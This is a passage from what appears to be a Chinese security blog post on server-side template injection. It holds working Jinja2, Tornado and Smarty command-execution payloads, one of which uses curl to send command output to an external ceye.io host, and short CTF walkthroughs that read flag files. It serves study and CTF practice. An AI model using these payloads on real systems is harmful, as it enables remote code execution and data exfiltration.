#print(c,res.text)</span><br><span class="line">        if &#x27;Mark&#x27; in res.text:</span><br><span class="line">            print(chr(c),end=&#x27;&#x27;)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+
+<p>也可以用外部平台例如ceye平台接收数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if lipsum.__globals__.os.popen(&quot;curl `whoami`.b182oj.ceye.io&quot;).read() ==1%&#125;&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里提供一种不需要远程服务器，并且只需要发一次请求的payload。原理就是通过两个内部两个for循环来遍历每个字符。因为其他方式似乎无法得到反斜杠，所以cmd使用chr函数组装。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr=lipsum.__globals__.__builtins__.chr %&#125;</span><br><span class="line">&#123;% set payload=lipsum.__globals__.os.popen(&#x27;ls&#x27;).read()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;%for i in range(payload|length)%&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&#123;%for j in range(32,127)%&#125;</span><br><span class="line">&#123;%if (payload[i])==chr(j)%&#125;</span><br><span class="line">*</span><br><span class="line">&#123;%endif%&#125;</span><br><span class="line">O</span><br><span class="line">&#123;%endfor%&#125;</span><br><span class="line">&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到的结果再用如下脚本进行读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">input=&#x27;&#x27;&#x27;</span><br><span class="line">OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*OOOOOOOOOOOOOOOOOOOOOOOOOOOO</span><br><span class="line">OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*OOOOOOOOOOO</span><br><span class="line">OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO*OOOOOOOOOOOOOOOOOOOOOOOOO</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in input.split(&#x27;\n&#x27;):</span><br><span class="line">    index=i.find(&#x27;*&#x27;)</span><br><span class="line">    if(index&gt;0):</span><br><span class="line">        print(chr(index+32),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-28-%E4%B8%8B%E5%8D%8812.49.08.png" alt="img"></p>
+<h3 id="Tornado"><a href="#Tornado" class="headerlink" title="Tornado"></a>Tornado</h3><p>Tornado是一个流行的Python Web框架，Tornado 模板是 Tornado 框架的一部分。</p>
+<h4 id="模板语法基础"><a href="#模板语法基础" class="headerlink" title="模板语法基础"></a>模板语法基础</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% ... %&#125; for Statements 语句</span><br><span class="line"></span><br><span class="line">&#123;&#123; ... &#125;&#125; for Expressions to print to the template output 表达式</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h4><p>Tornado 的SSTI漏洞更容易被利用，因为它不仅支持类的访问，而且还支持python中的指令，例如 <code>import</code> 指令。 </p>
+<p>可以直接导入 <code>os</code>模块并执行方法 <code>popen</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%import os%&#125;</span><br><span class="line">&#123;&#123;os.popen(&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="JAVA中的SSTI"><a href="#JAVA中的SSTI" class="headerlink" title="JAVA中的SSTI"></a>JAVA中的SSTI</h2><h3 id="velocity"><a href="#velocity" class="headerlink" title="velocity"></a>velocity</h3><p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。</p>
+<h4 id="模板语法基础-1"><a href="#模板语法基础-1" class="headerlink" title="模板语法基础"></a>模板语法基础</h4><p><strong>语句标识符</strong></p>
+<p>#用来标识Velocity的脚本语句，包括#set、#if、#else、#end、#foreach、#end、#include、#parse、#macro等语句。</p>
+<p><strong>变量</strong></p>
+<p>$用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a</p>
+<p><strong>声明</strong></p>
+<p>set用于声明Velocity脚本变量，变量可以在脚本中声明</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set($a =&quot;velocity&quot;)</span><br><span class="line">#set($b=1)</span><br><span class="line">#set($arrayName=[&quot;1&quot;,&quot;2&quot;])</span><br></pre></td></tr></table></figure>
+
+<p><strong>注释</strong></p>
+<p>单行注释为##，多行注释为成对出现的#* …………. *#</p>
+<p><strong>条件语句</strong></p>
+<p>以if&#x2F;else为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#if($foo&lt;10)</span><br><span class="line">    &lt;strong&gt;1&lt;/strong&gt;</span><br><span class="line">#elseif($foo==10)</span><br><span class="line">    &lt;strong&gt;2&lt;/strong&gt;</span><br><span class="line">#elseif($bar==6)</span><br><span class="line">    &lt;strong&gt;3&lt;/strong&gt;</span><br><span class="line">#else</span><br><span class="line">    &lt;strong&gt;4&lt;/strong&gt;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+
+<p><strong>转义字符</strong></p>
+<p>如果$a已经被定义，但是又需要原样输出$a，可以试用\转义作为关键的$</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>可以通过这张图来判断服务器使用的是什么模版。</p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-12/a98649c6cdc65546-20221215223714029.png" alt="模板注入"></p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-25-%E4%B8%8B%E5%8D%889.15.49.png" alt="img"></p>
+<p>很明显，这里是jinja2或者twig，随便输入一点东西，通过报错的判断，发现是jinja2</p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-25-%E4%B8%8B%E5%8D%889.17.28.png" alt="img"></p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[407](&#x27;whoami&#x27;,shell=True,stdout=-1).communicate()[0]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到flag</p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-25-%E4%B8%8B%E5%8D%889.24.55.png" alt="img"></p>
+<h3 id="CISCN2019华东南赛区Web11"><a href="#CISCN2019华东南赛区Web11" class="headerlink" title="CISCN2019华东南赛区Web11"></a>CISCN2019华东南赛区Web11</h3><p>首先打开题目页面，有很明显的提示，用的是Smarty模版引擎。</p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-25-%E4%B8%8B%E5%8D%889.33.51.png" alt="img"></p>
+<p>那么开始找注入点，页面上发现IP，结合下面的提示，用burp抓包添加个X-Forwarded-For头试试</p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-25-%E4%B8%8B%E5%8D%889.39.29.png" alt="img"></p>
+<p>可见确实存在ssti漏洞。直接cat读取文件：<code>&#123;system(&#39;cat /flag&#39;)&#125;</code></p>
+<p><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/%E6%88%AA%E5%B1%8F2022-07-25-%E4%B8%8B%E5%8D%889.46.17.png" alt="img"></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cadi2011/article/details/94569757">https://blog.csdn.net/cadi2011/article/details/94569757</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7518#toc-0">https://xz.aliyun.com/t/7518#toc-0</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11108">https://xz.aliyun.com/t/11108</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10056#toc-12">https://xz.aliyun.com/t/10056#toc-12</a></p>
+<p><a target="_blank" rel="noopener" href="https://gosecure.github.io/template-injection-workshop/#0">https://gosecure.github.io/template-injection-workshop/#0</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11090#toc-7">https://xz.aliyun.com/t/11090#toc-7</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9584#toc-24">https://xz.aliyun.com/t/9584#toc-24</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/258136.html">https://www.freebuf.com/articles/network/258136.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://diego.team/2020/11/19/Flask-jinja2-%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%99%A8-%E6%80%BB%E7%BB%93%E4%B8%8E%E5%88%86%E6%9E%90/">http://diego.team/2020/11/19/Flask-jinja2-%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%99%A8-%E6%80%BB%E7%BB%93%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246094">https://www.anquanke.com/post/id/246094</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://blog.tawnx.com">Tawnx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://blog.tawnx.com/2022/07/25/SSTI/">http://blog.tawnx.com/2022/07/25/SSTI/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/Security/">Security</a><a class="post-meta__tags" href="/tags/XSS/">XSS</a></div><div class="post_share"><div class="social-share" data-image="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-24-下午7.44.53.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/08/06/CSRF/" title="CSRF（跨站请求伪造）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CSRF（跨站请求伪造）</div></div></a></div><div class="next-post pull-right"><a href="/2022/07/14/C%E8%AF%AD%E8%A8%80scanf()%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/" title="C语言scanf()函数详解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">C语言scanf()函数详解</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/08/20/XSS/" title="XSS（跨站脚本攻击）"><img class="cover" src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-19-下午10.17.36.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-20</div><div class="title">XSS（跨站脚本攻击）</div></div></a></div><div><a href="/2022/08/06/CSRF/" title="CSRF（跨站请求伪造）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-06</div><div class="title">CSRF（跨站请求伪造）</div></div></a></div><div><a href="/2022/04/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化"><img class="cover" src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-05/未命名-2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-14</div><div class="title">PHP反序列化</div></div></a></div><div><a href="/2022/08/09/Upload/" title="Upload（文件上传漏洞）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-09</div><div class="title">Upload（文件上传漏洞）</div></div></a></div><div><a href="/2022/03/22/%E6%9C%80%E8%BF%91%E4%BD%BF%E7%94%A8hashcat%E9%81%87%E5%88%B0%E7%9A%84%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98/" title="最近使用hashcat遇到的各种问题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-22</div><div class="title">最近使用hashcat遇到的各种问题</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tawnx</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI%EF%BC%88%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">SSTI（服务端模版注入）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">1.1.1.</span> <span class="toc-text">模板引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.1.2.</span> <span class="toc-text">数据绑定示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80%E5%B8%B8%E8%A7%81%E6%A8%A1%E7%89%88%E5%BC%95%E6%93%8E"><span class="toc-number">1.1.3.</span> <span class="toc-text">各种语言常见模版引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI"><span class="toc-number">1.1.4.</span> <span class="toc-text">SSTI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E4%B8%AD%E7%9A%84SSTI"><span class="toc-number">1.2.</span> <span class="toc-text">PHP中的SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Twig"><span class="toc-number">1.2.1.</span> <span class="toc-text">Twig</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">基础语法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.1.1.1.</span> <span class="toc-text">变量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.1.1.2.</span> <span class="toc-text">设置变量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.2.1.1.3.</span> <span class="toc-text">过滤器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.1.1.4.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.1.1.5.</span> <span class="toc-text">控制结构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%95%E5%85%A5%E5%85%B6%E4%BB%96%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.2.1.1.6.</span> <span class="toc-text">引入其他模板</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-map-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.2.1.2.1.</span> <span class="toc-text">使用 map 过滤器</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Smarty"><span class="toc-number">1.2.2.</span> <span class="toc-text">Smarty</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-1"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">基础语法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%98%E9%87%8F-1"><span class="toc-number">1.2.2.1.1.</span> <span class="toc-text">变量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%BD%E6%95%B0-1"><span class="toc-number">1.2.2.1.2.</span> <span class="toc-text">函数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-1"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP%E5%87%BD%E6%95%B0%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text">PHP函数直接使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#literal-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.2.2.2.</span> <span class="toc-text">{literal} 标签</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#include-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.2.2.2.3.</span> <span class="toc-text">{include} 标签</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%B1%BB%E7%9A%84%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.2.4.</span> <span class="toc-text">获取类的静态方法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-26120"><span class="toc-number">1.2.2.2.5.</span> <span class="toc-text">CVE-2021-26120</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-29454"><span class="toc-number">1.2.2.2.6.</span> <span class="toc-text">CVE-2021-29454</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E4%B8%AD%E7%9A%84SSTI"><span class="toc-number">1.3.</span> <span class="toc-text">Python中的SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Jinja"><span class="toc-number">1.3.1.</span> <span class="toc-text">Jinja</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95-2"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">基础语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-2"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8file%E5%AF%B9%E8%B1%A1%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.1.2.1.</span> <span class="toc-text">利用file对象读取文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-subprocess-Popen-%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.1.2.2.</span> <span class="toc-text">使用 subprocess.Popen 类执行命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E6%83%B3%E8%A6%81%E7%9A%84%E6%A8%A1%E5%9D%97%E6%88%96%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.1.2.3.</span> <span class="toc-text">搜索想要的模块或函数</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">绕过过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7"><span class="toc-number">1.3.1.3.1.</span> <span class="toc-text">引号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.3.1.3.2.</span> <span class="toc-text">中括号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8B%E5%88%92%E7%BA%BF%E5%92%8C%E7%82%B9"><span class="toc-number">1.3.1.3.3.</span> <span class="toc-text">下划线和点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8C%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.3.1.3.4.</span> <span class="toc-text">双大括号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E5%AD%97"><span class="toc-number">1.3.1.3.5.</span> <span class="toc-text">数字</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tornado"><span class="toc-number">1.3.2.</span> <span class="toc-text">Tornado</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">模板语法基础</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-3"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">利用方式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JAVA%E4%B8%AD%E7%9A%84SSTI"><span class="toc-number">1.4.</span> <span class="toc-text">JAVA中的SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#velocity"><span class="toc-number">1.4.1.</span> <span class="toc-text">velocity</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80-1"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">模板语法基础</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.5.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11"><span class="toc-number">1.5.1.</span> <span class="toc-text">CISCN2019华东南赛区Web11</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.6.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/12/20/Python%E4%BB%A3%E7%A0%81%E6%89%93%E5%8C%85exe/" title="Python代码打包exe">Python代码打包exe</a><time datetime="2022-12-20T11:50:38.000Z" title="Created 2022-12-20 19:50:38">2022-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/08/20/XSS/" title="XSS（跨站脚本攻击）"><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-19-下午10.17.36.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS（跨站脚本攻击）"/></a><div class="content"><a class="title" href="/2022/08/20/XSS/" title="XSS（跨站脚本攻击）">XSS（跨站脚本攻击）</a><time datetime="2022-08-20T11:50:38.000Z" title="Created 2022-08-20 19:50:38">2022-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/08/09/Upload/" title="Upload（文件上传漏洞）">Upload（文件上传漏洞）</a><time datetime="2022-08-09T09:14:38.000Z" title="Created 2022-08-09 17:14:38">2022-08-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/08/06/CSRF/" title="CSRF（跨站请求伪造）">CSRF（跨站请求伪造）</a><time datetime="2022-08-06T07:50:38.000Z" title="Created 2022-08-06 15:50:38">2022-08-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/25/SSTI/" title="SSTI（服务端模版注入）"><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-24-下午7.44.53.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSTI（服务端模版注入）"/></a><div class="content"><a class="title" href="/2022/07/25/SSTI/" title="SSTI（服务端模版注入）">SSTI（服务端模版注入）</a><time datetime="2022-07-25T13:03:38.000Z" title="Created 2022-07-25 21:03:38">2022-07-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tawnx</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script 